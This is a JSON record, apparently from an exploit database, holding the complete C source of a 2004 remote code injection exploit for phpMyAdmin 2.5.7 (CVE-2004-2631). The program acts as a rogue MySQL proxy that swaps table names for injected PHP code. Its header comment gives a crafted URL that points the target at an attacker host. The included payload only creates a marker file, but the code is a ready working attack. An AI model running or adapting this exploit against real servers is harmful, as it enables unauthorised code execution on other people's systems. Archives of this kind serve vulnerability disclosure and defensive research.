{
  "id": "309",
  "title": "phpMyAdmin 2.5.7 - Remote code Injection",
  "cve": "CVE-2004-2631",
  "vuln_type": "unknown",
  "code": "/*    \r\n * phpmy-explt.c  \r\n * written by Nasir Simbolon <nasir kecapi com>\r\n * eagle kecapi com\r\n * Jakarta, Indonesia\r\n * \r\n * June, 10 2004 \r\n * \r\n * A phpMyAdmin-2.5.7 exploite program.\r\n * This is a kind of   mysql server wrapper  acts like a proxy except that it will sends a fake table name,\r\n * when client query \"SHOW TABLES\",  by replacing the real table name with a string contains exploite codes.\r\n *\r\n * Compile : gcc phpmy-explt.c -o phpmy-explt\r\n *\r\n * run with\r\n * ./phpmy-explt\r\n *\r\n * and go to your target and put \r\n *\r\n * http://target/phpMyAdmin-2.5.7/left.php?server=4&cfg[Servers][4][host]=\r\n * attacker.host.com&cfg[Servers][4][port]=8889&cfg[Servers][4][auth_type]=config&cfg[Servers]\r\n * [4][user]=user&cfg[Servers][4][password]=pass&cfg[Servers][4][connect_type]=tcp&&cfg[Servers]\r\n * [4][only_db]=databasename\r\n *\r\n * fill host,port,user,pass and databasename correctly\r\n *\r\n */\r\n\r\n\r\n#include<stdio.h>\r\n#include<sys/socket.h>\r\n#include<netdb.h>\r\n\r\n#define BIND_PORT 8889\r\n#define MYSQL_PORT 3306\r\n#define HOSTNAME \"localhost\"\r\n#define DATABASE \"phpmy\"\r\n\r\n\r\n#define BUFFER_LEN 1024\r\n\r\n/* This is php code we want to inject into phpMyAdmin \r\n   Do NOT use  single quote (') in the string, use double quote (\") instead\r\n*/\r\nchar *phpcodes = \"exec(\\\"touch /tmp/your-phpmyadmin-is-vulnerable\\\");\";\r\n\r\n\r\n  /* This is examples codes I captured when mysql server\r\n     reply to client's request of query \"SHOW TABLES\" query.\r\n     It shows  database  name 'phpmy' and contain one tablename  'mytable'\r\n     Our aim is to manipulate the data received from mysql server\r\n     by replacing 'mytable' with our exploide codes.\r\n     \r\n     0x1 ,0x0 ,0x0 ,0x1 ,0x1 ,0x1b,0x0 ,0x0 ,0x2 ,0x0 ,\r\n     0xf ,'T' ,'a' ,'b' ,'l' ,'e' ,'s' ,'_' ,'i' ,'n' ,\r\n     '_' ,'p' ,'h' ,'p' ,'m' ,'y' ,0x3 ,0x40,0x0 ,0x0 ,\r\n     0x1 ,-2  ,0x3 ,0x1 ,0x0 ,0x1f,0x1 ,0x0 ,0x0 ,0x3 ,\r\n     -2  ,8  ,0x0 ,0x0 ,0x4 ,7   ,'m' ,'y' ,'t' ,'a' ,\r\n     'b' ,'l' ,'e' ,0x1 ,0   ,0   ,0x5 ,-2\r\n  */\r\n\r\n\r\nint build_exploite_code(char* dbname,char* phpcodes,char** expcode)\r\n{\t\r\n   char my1[21] = {0x1 ,0x0 ,0x0 ,0x1 ,0x1 ,0x1b,0x0 ,0x0 ,0x2 ,0x0 ,\r\n     \t \t   0xf ,'T' ,'a' ,'b' ,'l' ,'e' ,'s' ,'_' ,'i' ,'n' ,\r\n     \t\t   '_'}; \r\n   /* part of dbname     ('p' ,'h' ,'p' ,'m' ,'y') */\r\n   char my2[15] = {0x3 ,0x40,0x0 ,0x0 ,0x1 ,-2  ,0x3 ,0x1 ,0x0 ,0x1f,\r\n\t           0x1 ,0x0 ,0x0 ,0x3 ,-2};  \r\n   /* part of int phpcodes string length +1   (8) */ \r\n   char my3[3]  = {0x0 ,0x0 ,0x4};\r\n   /* part of int phpcodes string length      (7) */ \r\n   /* part of tablename    ('m' ,'y' ,'t' ,'a' ,'b' ,'l' ,'e' ) */\r\n   char my4[5]  = {0x1 ,0   ,0   ,0x5 ,-2};\r\n\t\r\n   int len,i;\r\n\r\n   len = 21 + strlen(dbname) + 15 + 1 + 3 + 1 +  strlen(phpcodes) + 5 + 5;\r\n   *expcode = (char*) malloc(sizeof(char) * len); \r\n   \r\n   i = 0;\r\n   bcopy(&my1[0],*expcode + i,21);\r\n   i += 21;\r\n   bcopy(dbname, *expcode + i,strlen(dbname));\r\n   i += strlen(dbname);\r\n   bcopy(&my2[0],*expcode + i,15);\r\n   i += 15;\r\n   (*expcode)[i] = 5 + strlen(phpcodes) + 1;\r\n   i ++;\r\n   bcopy(&my3[0],*expcode + i,3);\r\n   i += 3;  \r\n   (*expcode)[i++] = 5 + strlen(phpcodes) ;\r\n   /* this is our exploite codes*/\r\n   (*expcode)[i++] = '\\\\'; \r\n   (*expcode)[i++] = '\\''; \r\n   (*expcode)[i++] = ';'; \r\n   bcopy(phpcodes,*expcode + i,strlen(phpcodes));\r\n   i += strlen(phpcodes);\r\n   (*expcode)[i++] = '/'; \r\n   (*expcode)[i++] = '*'; \r\n   bcopy(&my4[0],*expcode + i,5);\r\n   \r\n   return len;\r\n}\r\n\r\n/* connect to mysql server*/\r\n\r\nint connect_mysql()\r\n{\r\n    int s2;\r\n    struct sockaddr_in ina;\r\n    struct hostent *h;\r\n    \r\n    h = gethostbyname(HOSTNAME);\r\n    /* set internet address */\r\n    bcopy(h->h_addr,(void *)&ina.sin_addr,h->h_length);\r\n    ina.sin_family = AF_INET;\r\n    ina.sin_port = htons(MYSQL_PORT);\r\n    //ina.sin_zero[0]='\\0';\r\n    if((s2=socket(AF_INET,SOCK_STREAM,0)) < 0) \r\n  \tperror(\"Socket: \");\r\n    \r\n    if(connect(s2,(struct sockaddr *)&ina,sizeof(ina)) < 0 )\r\n\t                   perror(\"connect()\");\r\n    return s2;\r\n}\r\n\r\n/* listener */\r\nint listener()\r\n{\r\n    int s1;\r\n    int opt;\r\n    struct sockaddr_in ina;\r\n\r\n    /* set internet address */\r\n    ina.sin_family = AF_INET;\r\n    ina.sin_port = htons(BIND_PORT);\r\n    ina.sin_addr.s_addr = INADDR_ANY;\r\n\r\n    if((s1=socket(AF_INET,SOCK_STREAM,0)) < 0) \r\n  \tperror(\"Socket: \");\r\n    \r\n    opt = 1;\r\n    setsockopt(s1,SOL_SOCKET, SO_REUSEADDR , (char *)&opt, sizeof(opt) );\r\n       \r\n    if(bind(s1,(struct sockaddr *)&ina,sizeof(ina))==-1) \r\n\tperror(\"Bind: \");\r\n\t\r\n    if(listen(s1, 10) == -1) \r\n  \tperror(\"Listen\"); \r\n\t\r\n   return s1;\r\n}\r\n\r\n\r\nint main(int argc,char* argv[])\r\n{\r\n\tstruct sockaddr_in ina1;\r\n\tint ina1_l;\r\n\tint s_daemon,s_mysql;\r\n\tsize_t byte_read,byte_written;\r\n\tchar *buf;\r\n\tint sc,event,n_select;\r\n\tfd_set rfds;\r\n        struct timeval tv;\t \r\n\tint exptlen,i;\r\n\tchar *expt;\r\n\tchar *dbname=DATABASE;\r\n\t\r\n\tbuf = (char*) malloc(sizeof(char) * (BUFFER_LEN));\r\n\ttv.tv_sec  = 15;\r\n\ttv.tv_usec = 0;\r\n\t\r\n\t/* we listen to port */\r\n\t s_daemon = listener();\r\n    \r\n\texptlen = build_exploite_code(dbname,phpcodes,&expt);\r\n\r\n\tfor(;;) \r\n\t{\r\n\t   fprintf(stderr,\"waiting for connection\\n\");\r\n\t   \r\n\t   if( -1 == (sc = accept(s_daemon,(struct sockaddr *) &ina1,&ina1_l)) ) \r\n\t\t  perror(\"accept()\");\r\n\t   /* if we get here, we have a new connection */\r\n\t   fprintf(stderr,\"got client connection\\n\");\r\nmysql:\r\n\t   /* connect to mysql */\r\n\t   s_mysql = connect_mysql();\r\n        \r\n\t   for(;;) \r\n\t    {\r\n\t   \tFD_ZERO(&rfds);\r\n\t        FD_SET(sc,&rfds);\r\n  \t   \tFD_SET(s_mysql,&rfds);                                \r\n\t\t\r\n\t        n_select = (sc > s_mysql)? sc : s_mysql;\r\n\r\n\t    \tevent = select(n_select+1,&rfds,NULL,NULL,NULL);\r\n\t    \tif(-1  == event) \r\n\t\t    perror(\"select()\");\r\n\t        else \r\n\t\t{\t\r\n\t\t    if(FD_ISSET(s_mysql,&rfds)) \r\n\t\t     {\r\n\t\t\tbyte_read = read(s_mysql,buf,BUFFER_LEN);\r\n\t\t    \t/* check for closing client connection*/\r\n\t\t    \tif(byte_read == 0) \r\n\t  \t        {\r\n\t\t\t   shutdown(s_mysql,SHUT_RDWR);\r\n\t\t\t   close(s_mysql);\r\n\t\t\t   goto mysql;\r\n\t\t        }\r\n\r\n\t\t\t /* check data received from mysql server.\r\n\t\t\t  * if  buf[11] contain 'T', data received from   mysq server is table list\r\n\t\t\t  *\r\n\t\t\t  * NOW we replace the table with our exploite codes and send them to client\r\n\t\t\t  */\r\n\t\t        if( 'T' == buf[11])\r\n\t\t\t{\r\n\t\t           for(i=0;i<exptlen;i++) \r\n\t\t              buf[i] = expt[i];\r\n\t\t           byte_read = exptlen;\r\n\t\t        }\r\n\t\t       \r\n\t\t        if(write(sc, buf, byte_read) < 0)\r\n\t\t           break; \r\n\t\t     }\r\n\t           \r\n\t             if(FD_ISSET(sc,&rfds)) \r\n\t\t     {\t\r\n\t   \t         byte_read = read(sc,buf,BUFFER_LEN);\r\n\t\t         /* check for closing client connection*/\r\n\t\t         if(byte_read == 0) \r\n\t\t         {\t\r\n\t\t\t    close(sc);    \r\n\t\t\t    break;\r\n\t\t         }\r\n\r\n\t\t       if(write(s_mysql,buf,byte_read) < 0) \r\n\t\t\t       break; \t    \r\n\t\t     }    \r\n#if defined(DEBUG)\t\t     \r\n\t\t     fprintf(stderr,\"data:\\n\");\t\r\n\t\t     for(i=0;i<byte_read;i++) \r\n\t\t\t     fprintf(stderr,\" %c(%x) \",buf[i],buf[i]);\r\n#endif    \r\n\t        }   \r\n\r\n\t    } \r\n\t}\r\n\tfree(buf);\r\n\tfree(expt);\r\n\treturn 0;\r\n}\r\n\r\n// milw0rm.com [2004-07-04]",
  "url": "https://www.exploit-db.com/exploits/309"
}